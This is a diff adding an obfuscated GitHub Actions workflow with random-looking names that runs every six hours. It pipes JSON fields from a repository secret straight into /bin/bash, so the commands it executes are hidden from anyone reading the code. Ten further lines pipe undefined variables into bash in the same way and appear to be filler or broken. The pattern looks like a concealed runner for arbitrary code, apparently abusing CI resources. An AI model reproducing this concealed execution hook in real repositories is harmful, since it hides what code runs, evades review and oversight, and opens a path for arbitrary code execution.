@@ -1,0 +1,26 @@
+name: sanbajiej
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '28 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: sanbajiej
+        env:
+          c0: ${{ secrets.c0 }}
+        run: |
+          echo $c0 | jq -r .akluy799 | /bin/bash
+          echo $knmhz9 | jq -r .kgasv537 | /bin/bash
+          echo $gmjw9804 | jq -r .bsphl960 | /bin/bash
+          echo $y5805 | jq -r .r042 | /bin/bash
+          echo $krnz4749 | jq -r .rucql20 | /bin/bash
+          echo $qpn9 | jq -r .lvnt9 | /bin/bash
+          echo $sd5822 | jq -r .bufet74478 | /bin/bash
+          echo $ucmr47 | jq -r .nw69002 | /bin/bash
+          echo $xoufi790 | jq -r .khlg306 | /bin/bash
+          echo $hcv35229 | jq -r .g0620 | /bin/bash
+          echo $rwy3591 | jq -r .z041 | /bin/bash
+
